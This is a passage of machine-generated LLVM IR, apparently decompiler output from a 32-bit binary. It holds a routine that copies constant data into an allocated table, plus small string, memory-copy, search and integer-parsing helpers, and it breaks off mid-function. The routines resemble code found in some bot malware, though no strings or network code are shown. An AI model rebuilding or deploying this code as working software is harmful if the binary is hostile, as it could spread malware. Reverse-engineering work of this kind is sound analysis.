  %v3_129e8 = call i32 @function_12d10(i32 %v1_129d8, i32 ptrtoint (i32* @global_var_16460.529 to i32), i32 %v0_129dc)
  %v0_129ec = load i32, i32* %fp.global-to-local, align 4
  %v0_129f0 = load i32, i32* @r5, align 4
  store i32 %v0_129f0, i32* @global_var_1ede0.530, align 4
  %v0_129f4 = load i32, i32* @r7, align 4
  %v1_129f4 = trunc i32 %v0_129f4 to i8
  store i8 %v1_129f4, i8* bitcast (i32* @global_var_1ede4.531 to i8*), align 4
  %v0_129f8 = load i32, i32* @r6, align 4
  %v1_129f8 = trunc i32 %v0_129f8 to i8
  store i8 %v1_129f8, i8* bitcast (i32* @global_var_1ede5.532 to i8*), align 4
  %v1_129fc = call i32 @function_14100(i32 %v0_129ec)
  %v0_12a04 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_129fc, i32* @r5, align 4
  %v3_12a0c = call i32 @function_12d10(i32 %v1_129fc, i32 ptrtoint (i32* @global_var_16470.534 to i32), i32 %v0_12a04)
  %v0_12a10 = load i32, i32* %sb.global-to-local, align 4
  %v0_12a14 = load i32, i32* @r5, align 4
  store i32 %v0_12a14, i32* @global_var_1ede8.535, align 4
  %v1_12a18 = trunc i32 %v0_12a04 to i8
  store i8 %v1_12a18, i8* bitcast (i32* @global_var_1edec.536 to i8*), align 4
  %v0_12a1c = load i32, i32* @r6, align 4
  %v1_12a1c = trunc i32 %v0_12a1c to i8
  store i8 %v1_12a1c, i8* bitcast (i32* @global_var_1eded.537 to i8*), align 4
  %v1_12a20 = call i32 @function_14100(i32 %v0_12a10)
  %v0_12a28 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v1_12a20, i32* @r5, align 4
  %v3_12a30 = call i32 @function_12d10(i32 %v1_12a20, i32 ptrtoint (i32* @global_var_16484.539 to i32), i32 %v0_12a28)
  %v0_12a38 = load i32, i32* @r5, align 4
  store i32 %v0_12a38, i32* @global_var_1edf0.540, align 4
  %v1_12a3c = trunc i32 %v0_12a28 to i8
  store i8 %v1_12a3c, i8* bitcast (i32* @global_var_1edf4.541 to i8*), align 4
  %v0_12a40 = load i32, i32* @r6, align 4
  %v1_12a40 = trunc i32 %v0_12a40 to i8
  store i8 %v1_12a40, i8* bitcast (i32* @global_var_1edf5.542 to i8*), align 4
  %v1_12a44 = call i32 @function_14100(i32 8)
  store i32 %v1_12a44, i32* @r5, align 4
  %v4_12a54 = call i32 @function_12d10(i32 %v1_12a44, i32 ptrtoint ([9 x i8]* @global_var_16498.544 to i32), i32 8)
  store i8 8, i8* bitcast (i32* @global_var_1edfc.545 to i8*), align 4
  %v0_12a64 = load i32, i32* @r5, align 4
  store i32 %v0_12a64, i32* @global_var_1edf8.546, align 4
  %v0_12a68 = load i32, i32* @r6, align 4
  %v1_12a68 = trunc i32 %v0_12a68 to i8
  store i8 %v1_12a68, i8* bitcast (i32* @global_var_1edfd.547 to i8*), align 4
  %v1_12a6c = call i32 @function_14100(i32 11)
  store i32 %v1_12a6c, i32* @r5, align 4
  %v3_12a7c = call i32 @function_12d10(i32 %v1_12a6c, i32 ptrtoint (i32* @global_var_16380.549 to i32), i32 11)
  %v0_12a84 = load i32, i32* @r7, align 4
  store i8 11, i8* bitcast (i32* @global_var_1ee04.550 to i8*), align 4
  %v0_12a8c = load i32, i32* @r5, align 4
  store i32 %v0_12a8c, i32* @global_var_1ee00.551, align 4
  %v0_12a90 = load i32, i32* @r6, align 4
  %v1_12a90 = trunc i32 %v0_12a90 to i8
  store i8 %v1_12a90, i8* bitcast (i32* @global_var_1ee05.552 to i8*), align 4
  %v1_12a94 = call i32 @function_14100(i32 %v0_12a84)
  %v0_12a98 = load i32, i32* @r7, align 4
  store i32 %v1_12a94, i32* @r5, align 4
  %v3_12aa4 = call i32 @function_12d10(i32 %v1_12a94, i32 ptrtoint (i32* @global_var_164a4.554 to i32), i32 %v0_12a98)
  %v0_12aac = load i32, i32* @r5, align 4
  store i32 %v0_12aac, i32* @global_var_1ee08.555, align 4
  %v0_12ab0 = load i32, i32* @r7, align 4
  %v1_12ab0 = trunc i32 %v0_12ab0 to i8
  store i8 %v1_12ab0, i8* bitcast (i32* @global_var_1ee0c.556 to i8*), align 4
  %v0_12ab4 = load i32, i32* @r6, align 4
  %v1_12ab4 = trunc i32 %v0_12ab4 to i8
  store i8 %v1_12ab4, i8* bitcast (i32* @global_var_1ee0d.557 to i8*), align 4
  %v1_12ab8 = call i32 @function_14100(i32 18)
  store i32 %v1_12ab8, i32* @r5, align 4
  %v3_12ac8 = call i32 @function_12d10(i32 %v1_12ab8, i32 ptrtoint (i32* @global_var_164b4.559 to i32), i32 18)
  store i8 18, i8* bitcast (i32* @global_var_1ee14.560 to i8*), align 4
  %v0_12ad8 = load i32, i32* @r5, align 4
  store i32 %v0_12ad8, i32* @global_var_1ee10.561, align 4
  %v0_12adc = load i32, i32* @r6, align 4
  %v1_12adc = trunc i32 %v0_12adc to i8
  store i8 %v1_12adc, i8* bitcast (i32* @global_var_1ee15.562 to i8*), align 4
  %v1_12ae0 = call i32 @function_14100(i32 25)
  store i32 %v1_12ae0, i32* @r5, align 4
  %v3_12af0 = call i32 @function_12d10(i32 %v1_12ae0, i32 ptrtoint (i32* @global_var_164c8.564 to i32), i32 25)
  store i8 25, i8* bitcast (i32* @global_var_1ee1c.565 to i8*), align 4
  %v0_12b00 = load i32, i32* @r5, align 4
  store i32 %v0_12b00, i32* @global_var_1ee18.566, align 4
  %v0_12b04 = load i32, i32* @r6, align 4
  %v1_12b04 = trunc i32 %v0_12b04 to i8
  store i8 %v1_12b04, i8* bitcast (i32* @global_var_1ee1d.567 to i8*), align 4
  %v1_12b08 = call i32 @function_14100(i32 111)
  store i32 111, i32* @r5, align 4
  store i32 %v1_12b08, i32* @r7, align 4
  %v3_12b1c = call i32 @function_12d10(i32 %v1_12b08, i32 ptrtoint (i32* @global_var_164e4.569 to i32), i32 111)
  %v0_12b20 = load i32, i32* @r5, align 4
  %v0_12b24 = load i32, i32* @r7, align 4
  store i32 %v0_12b24, i32* @global_var_1ee20.570, align 4
  %v1_12b28 = trunc i32 %v0_12b20 to i8
  store i8 %v1_12b28, i8* bitcast (i32* @global_var_1ee24.571 to i8*), align 4
  %v0_12b2c = load i32, i32* @r6, align 4
  %v1_12b2c = trunc i32 %v0_12b2c to i8
  store i8 %v1_12b2c, i8* bitcast (i32* @global_var_1ee25.572 to i8*), align 4
  %v1_12b30 = call i32 @function_14100(i32 %v0_12b20)
  %v0_12b34 = load i32, i32* @r5, align 4
  store i32 %v1_12b30, i32* @r7, align 4
  %v3_12b40 = call i32 @function_12d10(i32 %v1_12b30, i32 ptrtoint (i32* @global_var_16554.574 to i32), i32 %v0_12b34)
  %v0_12b48 = load i32, i32* @r7, align 4
  store i32 %v0_12b48, i32* @global_var_1ee28.575, align 4
  %v0_12b4c = load i32, i32* @r5, align 4
  %v1_12b4c = trunc i32 %v0_12b4c to i8
  store i8 %v1_12b4c, i8* bitcast (i32* @global_var_1ee2c.576 to i8*), align 4
  %v0_12b50 = load i32, i32* @r6, align 4
  %v1_12b50 = trunc i32 %v0_12b50 to i8
  store i8 %v1_12b50, i8* bitcast (i32* @global_var_1ee2d.577 to i8*), align 4
  %v1_12b54 = call i32 @function_14100(i32 110)
  %v0_12b58 = load i32, i32* @r5, align 4
  %v1_12b58 = add i32 %v0_12b58, -1
  store i32 %v1_12b58, i32* @r5, align 4
  store i32 %v1_12b54, i32* @r7, align 4
  %v3_12b68 = call i32 @function_12d10(i32 %v1_12b54, i32 ptrtoint (i32* @global_var_165c4.579 to i32), i32 %v1_12b58)
  %v0_12b6c = load i32, i32* @r5, align 4
  %v0_12b70 = load i32, i32* @r7, align 4
  store i32 %v0_12b70, i32* @global_var_1ee30.580, align 4
  %v1_12b74 = trunc i32 %v0_12b6c to i8
  store i8 %v1_12b74, i8* bitcast (i32* @global_var_1ee34.581 to i8*), align 4
  %v0_12b78 = load i32, i32* @r6, align 4
  %v1_12b78 = trunc i32 %v0_12b78 to i8
  store i8 %v1_12b78, i8* bitcast (i32* @global_var_1ee35.582 to i8*), align 4
  %v1_12b7c = call i32 @function_14100(i32 %v0_12b6c)
  %v0_12b80 = load i32, i32* @r5, align 4
  store i32 %v1_12b7c, i32* @r7, align 4
  %v3_12b8c = call i32 @function_12d10(i32 %v1_12b7c, i32 ptrtoint (i32* @global_var_16634.584 to i32), i32 %v0_12b80)
  %v0_12b94 = load i32, i32* @r5, align 4
  %v1_12b94 = trunc i32 %v0_12b94 to i8
  store i8 %v1_12b94, i8* bitcast (i32* @global_var_1ee3c.585 to i8*), align 4
  %v0_12b98 = load i32, i32* @r7, align 4
  store i32 %v0_12b98, i32* @global_var_1ee38.586, align 4
  %v0_12b9c = load i32, i32* @r6, align 4
  %v1_12b9c = trunc i32 %v0_12b9c to i8
  store i8 %v1_12b9c, i8* bitcast (i32* @global_var_1ee3d.587 to i8*), align 4
  %v1_12ba0 = call i32 @function_14100(i32 117)
  %v3_12bb0 = call i32 @function_12d10(i32 %v1_12ba0, i32 ptrtoint (i32* @global_var_166a4.589 to i32), i32 117)
  %v0_12bb8 = load i32, i32* @r6, align 4
  %v1_12bb8 = trunc i32 %v0_12bb8 to i8
  store i8 %v1_12bb8, i8* bitcast (i32* @global_var_1ee45.590 to i8*), align 4
  store i32 %v1_12ba0, i32* @global_var_1ee40.591, align 4
  store i8 117, i8* bitcast (i32* @global_var_1ee44.592 to i8*), align 4
  ret i32 %v3_12bb0

; uselistorder directives
  uselistorder i32 %v1_12b7c, { 1, 0 }
  uselistorder i32 %v1_12b54, { 1, 0 }
  uselistorder i32 %v1_12b30, { 1, 0 }
  uselistorder i32 %v1_12b08, { 1, 0 }
  uselistorder i32 %v1_12a94, { 1, 0 }
  uselistorder i32 %v1_12a20, { 1, 0 }
  uselistorder i32 %v1_129fc, { 1, 0 }
  uselistorder i32 %v1_129d8, { 1, 0 }
  uselistorder i32 %v1_129b4, { 1, 0 }
  uselistorder i32 %v1_12990, { 1, 0 }
  uselistorder i32 %v1_1296c, { 1, 0 }
  uselistorder i32 %v1_128a4, { 1, 0 }
  uselistorder i32 %v1_12740, { 1, 0 }
  uselistorder i32 %v1_1271c, { 1, 0 }
  uselistorder i32 %v1_12658, { 1, 0 }
  uselistorder i32 %v0_1263c, { 1, 0, 2 }
  uselistorder i32 %v1_12634, { 1, 0 }
  uselistorder i32 %v1_125c0, { 1, 0 }
  uselistorder i32 %v1_12520, { 1, 0 }
  uselistorder i32 %v1_124ac, { 1, 0 }
  uselistorder i32 %v1_1245c, { 1, 0 }
  uselistorder i32 %v1_1242c, { 1, 0 }
  uselistorder i32 117, { 1, 0 }
  uselistorder i32 111, { 1, 2, 0 }
  uselistorder i8 23, { 1, 0 }
  uselistorder i8 16, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i8 3, { 2, 1, 0 }
  uselistorder i8 6, { 6, 7, 4, 8, 5, 9, 0, 10, 11, 1, 2, 3 }
  uselistorder i8 4, { 4, 3, 2, 0, 1 }
  uselistorder i8 11, { 2, 3, 4, 0, 1 }
  uselistorder i8 5, { 12, 13, 0, 1, 10, 2, 3, 4, 5, 6, 7, 8, 11, 14, 9 }
  uselistorder i32 (i32, i32, i32)* @function_12d10, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 6, 5, 9, 8, 7, 3, 2, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1eca8.336 to i32), { 5, 0, 1, 2, 3, 4 }
}

define i32 @function_12c94(i8* %arg1) local_unnamed_addr {
dec_label_pc_12c94:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r2, align 4
  %v3_12c98 = load i8, i8* %arg1, align 1
  %v4_12c98 = zext i8 %v3_12c98 to i32
  %v2_12c9c = icmp eq i8 %v3_12c98, 0
  br i1 %v2_12c9c, label %dec_label_pc_12cb8, label %bb

dec_label_pc_12cb8:                               ; preds = %dec_label_pc_12ca8, %dec_label_pc_12c94
  %merge = phi i32 [ %v4_12c98, %dec_label_pc_12c94 ], [ %v1_12ca8, %dec_label_pc_12ca8 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_12c94
  br label %dec_label_pc_12ca8

dec_label_pc_12ca8:                               ; preds = %dec_label_pc_12ca8, %bb
  %v0_12ca8 = phi i32 [ %v1_12ca8, %dec_label_pc_12ca8 ], [ 0, %bb ]
  %v1_12ca8 = add i32 %v0_12ca8, 1
  %v2_12cac = add i32 %v1_12ca8, %tmp
  %v3_12cac = inttoptr i32 %v2_12cac to i8*
  %v4_12cac = load i8, i8* %v3_12cac, align 1
  %v2_12cb0 = icmp eq i8 %v4_12cac, 0
  br i1 %v2_12cb0, label %dec_label_pc_12cb8, label %dec_label_pc_12ca8

; uselistorder directives
  uselistorder i32 %v1_12ca8, { 1, 0, 2 }
}

define i32 @function_12cbc(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12cbc:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_12cbc = load i8, i8* %arg1, align 1
  %v3_12cbc = zext i8 %v2_12cbc to i32
  %v2_12cc0 = icmp eq i8 %v2_12cbc, 0
  br i1 %v2_12cc0, label %dec_label_pc_12d04, label %dec_label_pc_12cc8

dec_label_pc_12cc8:                               ; preds = %dec_label_pc_12cbc
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ccc

dec_label_pc_12ccc:                               ; preds = %dec_label_pc_12ccc, %dec_label_pc_12cc8
  %v0_12ccc = phi i32 [ %v1_12ccc, %dec_label_pc_12ccc ], [ 0, %dec_label_pc_12cc8 ]
  %v1_12ccc = add i32 %v0_12ccc, 1
  store i32 %v1_12ccc, i32* %ip.global-to-local, align 4
  %v2_12cd0 = add i32 %v1_12ccc, %tmp
  %v3_12cd0 = inttoptr i32 %v2_12cd0 to i8*
  %v4_12cd0 = load i8, i8* %v3_12cd0, align 1
  %v2_12cd4 = icmp eq i8 %v4_12cd0, 0
  br i1 %v2_12cd4, label %dec_label_pc_12cdc, label %dec_label_pc_12ccc

dec_label_pc_12cdc:                               ; preds = %dec_label_pc_12ccc
  %v7_12cdc = icmp eq i32 %v0_12ccc, -2
  br i1 %v7_12cdc, label %dec_label_pc_12cfc, label %dec_label_pc_12ce8.preheader

dec_label_pc_12ce8.preheader:                     ; preds = %dec_label_pc_12cdc, %dec_label_pc_12d04
  %storemerge = phi i32 [ %v3_12cbc, %dec_label_pc_12d04 ], [ %v1_12ccc, %dec_label_pc_12cdc ]
  %v2_12cf4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12ce8

dec_label_pc_12ce8:                               ; preds = %dec_label_pc_12ce8.dec_label_pc_12ce8_crit_edge, %dec_label_pc_12ce8.preheader
  %v2_12cf4 = phi i32 [ %v5_12cf4, %dec_label_pc_12ce8.dec_label_pc_12ce8_crit_edge ], [ %v2_12cf4.pre, %dec_label_pc_12ce8.preheader ]
  %v0_12cec = phi i32 [ %v0_12cec.pre, %dec_label_pc_12ce8.dec_label_pc_12ce8_crit_edge ], [ %tmp, %dec_label_pc_12ce8.preheader ]
  %v0_12ce8 = phi i32 [ %v0_12ce8.pre, %dec_label_pc_12ce8.dec_label_pc_12ce8_crit_edge ], [ %storemerge, %dec_label_pc_12ce8.preheader ]
  %v1_12ce8 = add i32 %v0_12ce8, -1
  store i32 %v1_12ce8, i32* @r2, align 4
  %v1_12cec = inttoptr i32 %v0_12cec to i8*
  %v2_12cec = load i8, i8* %v1_12cec, align 1
  %v5_12cec = add i32 %v0_12cec, 1
  store i32 %v5_12cec, i32* %r1.global-to-local, align 4
  %v3_12cf0 = icmp eq i32 %v0_12ce8, 0
  %v3_12cf4 = inttoptr i32 %v2_12cf4 to i8*
  store i8 %v2_12cec, i8* %v3_12cf4, align 1
  %v4_12cf4 = load i32, i32* @r0, align 4
  %v5_12cf4 = add i32 %v4_12cf4, 1
  store i32 %v5_12cf4, i32* @r0, align 4
  br i1 %v3_12cf0, label %dec_label_pc_12cfc.loopexit, label %dec_label_pc_12ce8.dec_label_pc_12ce8_crit_edge

dec_label_pc_12ce8.dec_label_pc_12ce8_crit_edge:  ; preds = %dec_label_pc_12ce8
  %v0_12ce8.pre = load i32, i32* @r2, align 4
  %v0_12cec.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12ce8

dec_label_pc_12cfc.loopexit:                      ; preds = %dec_label_pc_12ce8
  %v0_12cfc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12cfc

dec_label_pc_12cfc:                               ; preds = %dec_label_pc_12cfc.loopexit, %dec_label_pc_12cdc
  %v0_12cfc = phi i32 [ %v0_12cfc.pre, %dec_label_pc_12cfc.loopexit ], [ %v1_12ccc, %dec_label_pc_12cdc ]
  ret i32 %v0_12cfc

dec_label_pc_12d04:                               ; preds = %dec_label_pc_12cbc
  store i32 %v3_12cbc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12ce8.preheader

; uselistorder directives
  uselistorder i32 %v5_12cf4, { 1, 0 }
  uselistorder i32 %v0_12cec, { 1, 0 }
  uselistorder i32 %v1_12ccc, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v3_12cbc, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12ce8.preheader, { 1, 0 }
}

define i32 @function_12d10(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_12d10:
  %ip.global-to-local = alloca i32, align 4
  %v2_12d10 = icmp eq i32 %arg3, 0
  br i1 %v2_12d10, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_12d1c, %dec_label_pc_12d10
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_12d10
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12d1c

dec_label_pc_12d1c:                               ; preds = %dec_label_pc_12d1c, %bb
  %v0_12d1c = phi i32 [ %v1_12d24, %dec_label_pc_12d1c ], [ 0, %bb ]
  %v2_12d1c = add i32 %v0_12d1c, %arg2
  %v3_12d1c = inttoptr i32 %v2_12d1c to i8*
  %v4_12d1c = load i8, i8* %v3_12d1c, align 1
  %v4_12d20 = add i32 %v0_12d1c, %arg1
  %v5_12d20 = inttoptr i32 %v4_12d20 to i8*
  store i8 %v4_12d1c, i8* %v5_12d20, align 1
  %v0_12d24 = load i32, i32* %ip.global-to-local, align 4
  %v1_12d24 = add i32 %v0_12d24, 1
  store i32 %v1_12d24, i32* %ip.global-to-local, align 4
  %v9_12d28 = icmp eq i32 %v1_12d24, %arg3
  br i1 %v9_12d28, label %.loopexit, label %dec_label_pc_12d1c

; uselistorder directives
  uselistorder i32 %v1_12d24, { 1, 2, 0 }
}

define i32 @function_12d34(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12d34:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %v2_12d34 = icmp eq i32 %arg2, 0
  br i1 %v2_12d34, label %.loopexit, label %bb

.loopexit:                                        ; preds = %dec_label_pc_12d44, %dec_label_pc_12d34
  ret i32 %arg1

bb:                                               ; preds = %dec_label_pc_12d34
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12d44

dec_label_pc_12d44:                               ; preds = %dec_label_pc_12d44.dec_label_pc_12d44_crit_edge, %bb
  %v2_12d44 = phi i32 [ %v1_12d48, %dec_label_pc_12d44.dec_label_pc_12d44_crit_edge ], [ 0, %bb ]
  %v0_12d44.off0 = phi i8 [ %extract.t, %dec_label_pc_12d44.dec_label_pc_12d44_crit_edge ], [ 0, %bb ]
  %v4_12d44 = add i32 %v2_12d44, %arg1
  %v5_12d44 = inttoptr i32 %v4_12d44 to i8*
  store i8 %v0_12d44.off0, i8* %v5_12d44, align 1
  %v0_12d48 = load i32, i32* %r3.global-to-local, align 4
  %v1_12d48 = add i32 %v0_12d48, 1
  store i32 %v1_12d48, i32* %r3.global-to-local, align 4
  %v9_12d4c = icmp eq i32 %v1_12d48, %arg2
  br i1 %v9_12d4c, label %.loopexit, label %dec_label_pc_12d44.dec_label_pc_12d44_crit_edge

dec_label_pc_12d44.dec_label_pc_12d44_crit_edge:  ; preds = %dec_label_pc_12d44
  %v0_12d44.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_12d44.pre to i8
  br label %dec_label_pc_12d44

; uselistorder directives
  uselistorder i32 %v1_12d48, { 1, 2, 0 }
}

define i32 @function_12d58(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12d58:
  store i32 %arg4, i32* @lr, align 4
  %v7_12d6c = icmp sgt i32 %arg4, %arg2
  br i1 %v7_12d6c, label %dec_label_pc_12d70, label %dec_label_pc_12d78

dec_label_pc_12d70:                               ; preds = %dec_label_pc_12d8c, %dec_label_pc_12d58, %dec_label_pc_12d78
  ret i32 -1

dec_label_pc_12d78:                               ; preds = %dec_label_pc_12d58
  %tmp10 = icmp slt i32 %arg2, 1
  br i1 %tmp10, label %dec_label_pc_12d70, label %dec_label_pc_12d80

dec_label_pc_12d80:                               ; preds = %dec_label_pc_12d78
  br label %dec_label_pc_12d98

dec_label_pc_12d8c:                               ; preds = %dec_label_pc_12db0, %dec_label_pc_12d98
  %v1_12d8c = add i32 %v0_12db8, 1
  %v9_12d90 = icmp eq i32 %v1_12d8c, %arg2
  br i1 %v9_12d90, label %dec_label_pc_12d70, label %dec_label_pc_12d98

dec_label_pc_12d98:                               ; preds = %dec_label_pc_12d8c, %dec_label_pc_12d80
  %v0_12db8 = phi i32 [ %v1_12d8c, %dec_label_pc_12d8c ], [ 0, %dec_label_pc_12d80 ]
  %v0_12da4 = phi i32 [ %v1_12da4., %dec_label_pc_12d8c ], [ 0, %dec_label_pc_12d80 ]
  %v2_12d98 = add i32 %v0_12da4, %arg3
  %v3_12d98 = inttoptr i32 %v2_12d98 to i8*
  %v4_12d98 = load i8, i8* %v3_12d98, align 1
  %v2_12d9c = add i32 %v0_12db8, %arg1
  %v3_12d9c = inttoptr i32 %v2_12d9c to i8*
  %v4_12d9c = load i8, i8* %v3_12d9c, align 1
  %v9_12da0 = icmp eq i8 %v4_12d9c, %v4_12d98
  %v1_12da4 = add i32 %v0_12da4, 1
  %v1_12da4. = select i1 %v9_12da0, i32 %v1_12da4, i32 0
  br i1 %v9_12da0, label %dec_label_pc_12db0, label %dec_label_pc_12d8c

dec_label_pc_12db0:                               ; preds = %dec_label_pc_12d98
  %v9_12db0 = icmp eq i32 %v1_12da4., %arg4
  br i1 %v9_12db0, label %dec_label_pc_12db8, label %dec_label_pc_12d8c

dec_label_pc_12db8:                               ; preds = %dec_label_pc_12db0
  %v1_12db8 = add i32 %v0_12db8, 1
  ret i32 %v1_12db8

; uselistorder directives
  uselistorder i1 %v9_12da0, { 1, 0 }
  uselistorder i32 %v0_12da4, { 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_12d70, { 0, 2, 1 }
}

define i32 @function_12dc0(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_12dc0:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-28 = alloca i32, align 4
  %v3_12dc0 = load i32, i32* @r4, align 4
  store i32 %v3_12dc0, i32* %stack_var_-28, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12dcc

dec_label_pc_12dcc:                               ; preds = %.thread, %dec_label_pc_12de4, %bb, %dec_label_pc_12dc0
  %v0_12dcc = phi i32 [ %tmp, %dec_label_pc_12dc0 ], [ %v5_12dcc, %bb ], [ %v5_12dcc, %dec_label_pc_12de4 ], [ %v5_12dcc, %.thread ]
  %v1_12dcc = inttoptr i32 %v0_12dcc to i8*
  %v2_12dcc = load i8, i8* %v1_12dcc, align 1
  %v3_12dcc = zext i8 %v2_12dcc to i32
  %v5_12dcc = add i32 %v0_12dcc, 1
  store i32 %v5_12dcc, i32* %r5.global-to-local, align 4
  %v7_12dd4 = icmp eq i8 %v2_12dcc, 9
  br i1 %v7_12dd4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_12dcc
  store i32 %v3_12dcc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12dcc

bb:                                               ; preds = %dec_label_pc_12dcc
  %v8_12dd8 = icmp eq i8 %v2_12dcc, 32
  store i32 %v3_12dcc, i32* %r4.global-to-local, align 4
  br i1 %v8_12dd8, label %dec_label_pc_12dcc, label %dec_label_pc_12de4

dec_label_pc_12de4:                               ; preds = %bb
  %v7_12de4 = icmp eq i8 %v2_12dcc, 10
  br i1 %v7_12de4, label %dec_label_pc_12dcc, label %dec_label_pc_12dec

dec_label_pc_12dec:                               ; preds = %dec_label_pc_12de4
  %v7_12dec = icmp eq i8 %v2_12dcc, 45
  br i1 %v7_12dec, label %dec_label_pc_12ecc, label %dec_label_pc_12df4

dec_label_pc_12df4:                               ; preds = %dec_label_pc_12dec
  %v7_12df4 = icmp eq i8 %v2_12dcc, 43
  br i1 %v7_12df4, label %bb48, label %dec_label_pc_12e04

bb48:                                             ; preds = %dec_label_pc_12df4
  %v2_12df8 = inttoptr i32 %v5_12dcc to i8*
  %v3_12df8 = load i8, i8* %v2_12df8, align 1
  %v4_12df8 = zext i8 %v3_12df8 to i32
  store i32 %v4_12df8, i32* %r4.global-to-local, align 4
  %v6_12df8 = add i32 %v0_12dcc, 2
  store i32 %v6_12df8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12e04

dec_label_pc_12e04:                               ; preds = %bb48, %dec_label_pc_12df4, %dec_label_pc_12ecc
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_12ecc ], [ 2147483647, %dec_label_pc_12df4 ], [ 2147483647, %bb48 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_12ecc ], [ 0, %dec_label_pc_12df4 ], [ 0, %bb48 ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  %v2_12e0c = call i32 @function_133b0(i32 %storemerge1, i32 %arg2)
  %v0_12e10 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_12e10, i32* @r1, align 4
  store i32 %v2_12e0c, i32* %r8.global-to-local, align 4
  store i32 %storemerge1, i32* @r0, align 4
  %v0_12e1c = call i32 @function_132a0()
  store i32 %v0_12e1c, i32* @lr, align 4
  %v0_12e2c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e2c

dec_label_pc_12e2c:                               ; preds = %.thread8, %dec_label_pc_12e04
  %v2_12ea811 = phi i32 [ %v1_12ec426, %.thread8 ], [ 0, %dec_label_pc_12e04 ]
  %v1_12e84 = phi i32 [ %v0_12eb824, %.thread8 ], [ 0, %dec_label_pc_12e04 ]
  %v1_12e6c = phi i32 [ %v3_12eb0, %.thread8 ], [ %v0_12e2c.pre, %dec_label_pc_12e04 ]
  %v1_12e2c = urem i32 %v1_12e6c, 256
  %v1_12e30 = add nsw i32 %v1_12e2c, -48
  %v1_12e38 = add nsw i32 %v1_12e2c, -97
  %v1_12e3c = add i32 %v1_12e6c, -48
  %v1_12e40 = add nsw i32 %v1_12e2c, -65
  %tmp71 = icmp ult i32 %v1_12e30, 10
  br i1 %tmp71, label %dec_label_pc_12e70, label %dec_label_pc_12e48

dec_label_pc_12e48:                               ; preds = %dec_label_pc_12e2c
  %v2_12e48 = icmp ugt i32 %v1_12e40, 24
  %v7_12e48 = icmp eq i32 %v1_12e40, 25
  %v2_12e4c = xor i1 %v7_12e48, true
  %v3_12e4c = and i1 %v2_12e48, %v2_12e4c
  br i1 %v3_12e4c, label %bb49, label %bb50

bb49:                                             ; preds = %dec_label_pc_12e48
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_12e48, %bb49
  %v0_12e6020 = phi i32 [ %v1_12e3c, %dec_label_pc_12e48 ], [ 0, %bb49 ]
  %v2_12e50 = xor i1 %v2_12e48, true
  %v3_12e50 = or i1 %v7_12e48, %v2_12e50
  br i1 %v3_12e50, label %bb51, label %bb52

bb51:                                             ; preds = %bb50
  br label %bb52

bb52:                                             ; preds = %bb50, %bb51
  %v0_12e60 = phi i32 [ %v0_12e6020, %bb50 ], [ 1, %bb51 ]
  br i1 %v3_12e4c, label %bb53, label %bb54

bb53:                                             ; preds = %bb52
  %v6_12e58 = icmp ugt i32 %v1_12e38, 24
  %v11_12e58 = icmp eq i32 %v1_12e38, 25
  br label %bb54

bb54:                                             ; preds = %bb52, %bb53
  %v1_12e5c = phi i1 [ %v7_12e48, %bb52 ], [ %v11_12e58, %bb53 ]
  %v0_12e5c = phi i1 [ %v2_12e48, %bb52 ], [ %v6_12e58, %bb53 ]
  %v2_12e5c = xor i1 %v1_12e5c, true
  %v3_12e5c = and i1 %v0_12e5c, %v2_12e5c
